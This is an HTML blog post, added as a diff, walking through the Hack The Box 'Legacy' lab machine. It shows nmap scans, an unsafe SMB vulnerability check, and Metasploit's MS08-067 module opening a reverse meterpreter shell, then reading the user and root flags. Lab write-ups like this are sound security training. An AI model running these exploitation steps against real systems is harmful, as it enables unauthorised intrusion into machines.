@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Legacy - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-legacy"><a href="#Hack-The-Box-legacy" class="headerlink" title="Hack The Box - legacy"></a>Hack The Box - Legacy</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Legacy is a machine published on Hack The Box and is for beginners, requiring only one exploit to obtain root access, which demonstrates the potential security risks of <code>SMB on Windows</code>.The target is to get as a root user, its IP address is <code>10.10.10.4.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/legacy/0.png" alt=""></p><br>
+  
+  
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/legacy)<br>|<br>|-->{SFire129}#nmap -A -v 10.10.10.4
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 12:22 EDT 
+ Host is up (0.17s latency). 
+ Not shown: 997 filtered ports 
+ PORT     STATE  SERVICE       VERSION 
+ 139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn 
+ 445/tcp  open   microsoft-ds  Windows XP microsoft-ds 
+ 3389/tcp closed ms-wbt-server 
+ Device type: general purpose|specialized 
+ Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%) 
+ OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2 
+ Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows Server 2003 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 (90%) 
+ No exact OS matches for host (test conditions non-ideal). 
+ Network Distance: 2 hops 
+ TCP Sequence Prediction: Difficulty=263 (Good luck!) 
+ IP ID Sequence Generation: Incremental 
+ Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp 
+  
+ Host script results: 
+ |_clock-skew: mean: 5d00h28m58s, deviation: 2h07m16s, median: 4d22h58m58s 
+ | nbstat: NetBIOS name: LEGACY, NetBIOS user: unknown', NetBIOS MAC: 00:50:56:b9:29:23 (VMware) 
+ | Names: 
+ |   LEGACY<00>           Flags: unique active 
+ |   HTB<00>              Flags: group active 
+ |   LEGACY<20>           Flags: unique active 
+ |   HTB<1e>              Flags: group active 
+ |   HTB<1d>              Flags: unique active 
+ |_  \x01\x02__MSBROWSE__\x02 01  Flags: group active 
+ | smb-os-discovery: 
+ |   OS: Windows XP (Windows 2000 LAN Manager) 
+ |   OS CPE: cpe:/o:microsoft:windows_xp::- 
+ |   Computer name: legacy 
+ |   NetBIOS computer name: LEGACY\x00 
+ |   Workgroup: HTB\x00 
+ |_  System time: 2020-05-13T21:31:23+03:00 
+ | smb-security-mode: 
+ |   account_used: blank 
+ |   authentication_level: user 
+ |   challenge_response: supported 
+ |_  message_signing: disabled (dangerous, but default) 
+ |_smb2-time: Protocol negotiation failed (SMB2) 
+  
+ TRACEROUTE (using port 3389/tcp) 
+ HOP RTT       ADDRESS 
+ 1   173.35 ms 10.10.14.1 
+ 2   167.06 ms 10.10.10.4 
+  
+ NSE: Script Post-scanning. 
+ Completed NSE at 12:33, 0.00s elapsed 
+ Read data files from: /usr/bin/../share/nmap 
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
+ Nmap done: 1 IP address (1 host up) scanned in 75.26 seconds 
+            Raw packets sent: 2073 (94.608KB) | Rcvd: 45 (2.628KB) 
+ |-------(root@kali)-------|(~/HackTheBox/legacy) 
+ | 
+ |-->{SFire129}# </figure></pre>
+
+<p> We can see the <code>SMB Protcol</code> on Windows XP operative System, therefore we could try to identifier with vulnerability scan. Configure the script  from  <a class="vglnk" href="https://github.com/diegoexploit/tools/blob/master/nmap/scripts/smb-check-vulns.nse" rel="nofollow"><span>smb-check-vulns.nse</span></a> <p>
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/legacy)<br>|<br>|-->{SFire129}#nmap -script smb-check-vulns.nse -script-args=unsafe=1 10.10.10.4 
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 13:13 EDT 
+ Nmap scan report for 10.10.10.4 
+ Host is up (0.11s latency). 
+ Not shown: 997 filtered ports 
+ PORT     STATE  SERVICE 
+ 139/tcp  open   netbios-ssn 
+ 445/tcp  open   microsoft-ds 
+ 3389/tcp closed ms-wbt-server 
+  
+ Host script results: 
+ | smb-check-vulns: 
+ |   MS08-067: VULNERABLE 
+ |   Conficker: Likely CLEAN 
+ |   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE 
+ |   MS06-025: NO SERVICE (the Ras RPC service is inactive) 
+ |_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive) 
+  
+ Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds 
+ |-------(root@kali)-------|(~/HackTheBox/legacy) 
+ | 
+ |-->{SFire129}#</figure></pre>
+
+<p>The host is vulnerable to MS08-067 on port 445/tcp.<br>
+
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit "></a>Exploit</h2>
+<p>The next step is to search and to configure the exploit on Metasploit tool from Kali.</p>
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/legacy) 
+ | 
+ |-->{SFire129}#msfconsole 
+  
+                                    ___          ____ 
+                                ,-""   `.      < HONK > 
+                              ,'  _   e )`-._ /  ---- 
+                             /  ,' `-._<.===-' 
+                            /  / 
+                           /  ; 
+               _          /   ; 
+  (`._    _.-"" ""--..__,'    | 
+  <_  `-""                     \ 
+   <`-                          : 
+    (__   <__.                  ; 
+      `-.   '-.__.      _.'    / 
+         \      `-.__,-'    _,' 
+          `._    ,    /__,-' 
+             ""._\__,'< <____ 
+                  | |  `----.`. 
+                  | |        \ `. 
+                  ; |___      \-`` 
+                  \   --< 
+                   `.`.< 
+                     `-' 
+        =[ metasploit v5.0.86-dev                          ] 
+ + -- --=[ 2004 exploits - 1096 auxiliary - 343 post       ] 
+ + -- --=[ 566 payloads - 45 encoders - 10 nops            ] 
+ + -- --=[ 7 evasion                                       ] 
+ Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x 
+ msf5 >search ms08-067 
+ Matching Modules 
+ ================ 
+    #  Name                                 Disclosure Date  Rank   Check  Description 
+    -  ----                                 ---------------  ----   -----  ----------- 
+    0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption 
+ msf5 > use exploit/windows/smb/ms08_067_netapi 
+ msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4 
+ RHOSTS => 10.10.10.4 
+ msf5 exploit(windows/smb/ms08_067_netapi) > run 
+ [*] Started reverse TCP handler on 10.10.14.21:4444 
+ [*] 10.10.10.4:445 - Automatically detecting the target... 
+ [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English 
+ [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX) 
+ [*] 10.10.10.4:445 - Attempting to trigger the vulnerability... 
+ [*] Sending stage (180291 bytes) to 10.10.10.4 
+  meterpreter ><br>
+</figure></pre>
+
+<h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture The Flag"></a>Capture The Flag</h2>
+
+<p> The user flag can be obtained from C:\Documents and Settings\john\Desktop\user.txt and the root flag from C:\Documents and Settings\Administrator\Desktop\root.txt
+
+<pre><figure class="highlight plain">meterpreter > shell 
+ Process 1784 created. 
+ Channel 1 created. 
+ Microsoft Windows XP [Version 5.1.2600] 
+ (C) Copyright 1985-2001 Microsoft Corp. 
+ C:\WINDOWS\system32>ipconfig 
+ ipconfig 
+ Windows IP Configuration 
+ Ethernet adapter Local Area Connection: 
+  
+         Connection-specific DNS Suffix  . : 
+         IP Address. . . . . . . . . . . . : 10.10.10.4 
+         Subnet Mask . . . . . . . . . . . : 255.255.255.0 
+         Default Gateway . . . . . . . . . : 10.10.10.2 
+
+ C:\WINDOWS\system32>cd .. 
+ C:\WINDOWS>cd .. 
+ C:\>cd Users 
+ C:\>dir 
+  Volume in drive C has no label. 
+  Volume Serial Number is 54BF-723B 
+  Directory of C:\ 
+ 16/03/2017  08:30                  0 AUTOEXEC.BAT 
+ 16/03/2017  08:30                  0 CONFIG.SYS 
+ 16/03/2017  09:07     DIR          Documents and Settings 
+ 29/12/2017  11:41     DIR          Program Files 
+ 13/05/2020  08:14     DIR          WINDOWS 
+                2 File(s)              0 bytes 
+                3 Dir(s)   6.400.843.776 bytes free 
+ C:\>cd Documents and Settings 
+ C:\Documents and Settings>dir 
+ C:\Documents and Settings>cd John 
+ C:\Documents and Settings\john>dir
+ C:\Documents and Settings\john>cd Desktop
+ C:\Documents and Settings\john\Desktop>dir 
+	Directory of C:\Documents and Settings\john\Desktop 
+  
+ 16/03/2017  09:19     DIR          . 
+ 16/03/2017  09:19     DIR          .. 
+ 16/03/2017  09:19                 32 user.txt 
+                1 File(s)             32 bytes 
+                2 Dir(s)   6.400.897.024 bytes free 
+ C:\Documents and Settings\john\Desktop>type user.txt 
+ 
+ ***here will be show you the flag user***
+ Directory of C:\Documents and Settings\Administrator\Desktop 
+  
+ 16/03/2017  09:18     DIR          . 
+ 16/03/2017  09:18     DIR          .. 
+ 16/03/2017  09:18                 32 root.txt 
+                1 File(s)             32 bytes 
+                2 Dir(s)   6.400.888.832 bytes free 
+  
+ C:\Documents and Settings\Administrator\Desktop>type root.txt 
+
+***here will be show you the flag root***
+ C:\Documents and Settings\Administrator\Desktop></figure></pre>
+<p> And we owned root !
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-08</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#smb-check-vulns</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
